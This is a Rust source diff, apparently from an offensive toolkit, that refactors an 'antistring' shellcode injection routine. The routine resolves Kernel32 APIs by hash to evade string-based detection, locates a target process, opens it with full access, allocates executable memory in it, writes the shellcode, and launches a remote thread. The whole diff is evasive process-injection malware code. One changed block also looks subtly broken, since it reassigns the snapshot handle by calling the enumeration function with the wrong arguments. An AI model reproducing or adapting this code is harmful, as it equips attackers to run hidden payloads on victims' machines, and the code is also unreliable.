@@ -117,21 +117,25 @@ pub fn inject_and_migrate(shellcode: &[u8], target_process: &str) {
 
 #[cfg(feature = "antistring")]
 pub fn antistring_inject_and_migrate(shellcode: &[u8], target_process: &str) {
-    // See line 28
+    // See line 26
     let function = rco_utils::find_function_address("Kernel32", 0x139872fd098af4a7).unwrap();
-    let snapshot = unsafe {
-        mem::transmute::<*const (), fn(CREATE_TOOLHELP_SNAPSHOT_FLAGS, u32) -> HANDLE>
-        (function)(TH32CS_SNAPPROCESS, 0_u32)
-    };
+    let function = rco_utils::construct_win32_function!(function; [CREATE_TOOLHELP_SNAPSHOT_FLAGS, u32]; [HANDLE]);
+    let snapshot = unsafe { function(
+        TH32CS_SNAPPROCESS,
+        0_u32
+    ) };
 
-    // See line 38
+    // See line 35
     let function = rco_utils::find_function_address("Kernel32", 0x4cf400a249844bee).unwrap();
-    let mut pid: u32 = 0;
+    let function = rco_utils::construct_win32_function!(function; [HANDLE, &mut PROCESSENTRY32]; [BOOL]);
+    let snapshot = unsafe { function(
+        TH32CS_SNAPPROCESS,
+        0_u32
+    ) };
+    let mut pid = 0_u32;
     let mut process_entry = PROCESSENTRY32::default();
     process_entry.dwSize = mem::size_of::<PROCESSENTRY32>() as u32;
-    while unsafe {
-        mem::transmute::<*const (), fn(HANDLE, &mut PROCESSENTRY32) -> BOOL>
-        (function)(
+    while unsafe { function(
             snapshot,
             &mut process_entry
         ).as_bool()
@@ -150,56 +154,48 @@ pub fn antistring_inject_and_migrate(shellcode: &[u8], target_process: &str) {
         }
     }
 
-    // See line 62
+    // See line 61
     let function = rco_utils::find_function_address("Kernel32", 0x2c116091e452cf52).unwrap();
-    let explorer_handle = unsafe { 
-        mem::transmute::<*const (), fn(PROCESS_ACCESS_RIGHTS, bool, u32) -> HANDLE>
-        (function)(
-            PROCESS_ALL_ACCESS,
-            false,
-            pid
-        )
-    };
+    let function = rco_utils::construct_win32_function!(function; [PROCESS_ACCESS_RIGHTS, bool, u32]; [HANDLE]);
+    let explorer_handle = unsafe { function(
+        PROCESS_ALL_ACCESS,
+        false,
+        pid
+    ) };
 
-    // See line 72
+    // See line 70
     let function = rco_utils::find_function_address("Kernel32", 0x5cfd66a14ed9a43).unwrap();
-    let base_address = unsafe {
-        mem::transmute::<*const (), fn(HANDLE, *const u32, usize, VIRTUAL_ALLOCATION_TYPE, PAGE_PROTECTION_FLAGS) -> *const c_void>
-        (function)(
-            explorer_handle,
-            ptr::null(),
-            shellcode.len(),
-            MEM_COMMIT | MEM_RESERVE,
-            PAGE_EXECUTE_READWRITE
-        )
-    };
+    let function = rco_utils::construct_win32_function!(function; [HANDLE, *const u32, usize, VIRTUAL_ALLOCATION_TYPE, PAGE_PROTECTION_FLAGS]; [*const c_void]);
+    let base_address = unsafe { function(
+        explorer_handle,
+        ptr::null(),
+        shellcode.len(),
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_EXECUTE_READWRITE
+    ) };
 
-    // See line 77
+    // See line 83
     let function = rco_utils::find_function_address("Kernel32", 0x2638fa76194bfe63).unwrap();
-    unsafe { 
-        mem::transmute::<*const (), fn(HANDLE, *const c_void, *const c_void, usize, *mut usize)>
-        (function)(
-            explorer_handle,
-            base_address,
-            shellcode.as_ptr() as *const c_void,
-            shellcode.len(),
-            ptr::null_mut()
-        )
-    };
+    let function = rco_utils::construct_win32_function!(function; [HANDLE, *const c_void, *const c_void, usize, *mut usize]; [()]);
+    unsafe { function(
+        explorer_handle,
+        base_address,
+        shellcode.as_ptr() as *const c_void,
+        shellcode.len(),
+        ptr::null_mut()
+    ) };
 
-    // See line 85
+    // See line 99
     let function = rco_utils::find_function_address("Kernel32", 0x2a0b247f3bdeef70).unwrap();
     let start_address_option = unsafe { Some(mem::transmute(base_address)) };
-    unsafe {
-        mem::transmute::<*const (), fn(HANDLE, *const u32, u32, Option<unsafe extern "system" fn(*mut c_void) -> u32>, *const u32, u32, *mut u32)>
-        (function)(
-            explorer_handle,
-            ptr::null(),
-            0,
-            start_address_option,
-            ptr::null(),
-            0,
-            ptr::null_mut()
-        )
-    };
+    let function = rco_utils::construct_win32_function!(function; [HANDLE, *const u32, u32, Option<unsafe extern "system" fn(*mut c_void) -> u32>, *const u32, u32, *mut u32]; [()]);
+    unsafe { function(
+        explorer_handle,
+        ptr::null(),
+        0,
+        start_address_option,
+        ptr::null(),
+        0,
+        ptr::null_mut()
+    ) };
 }
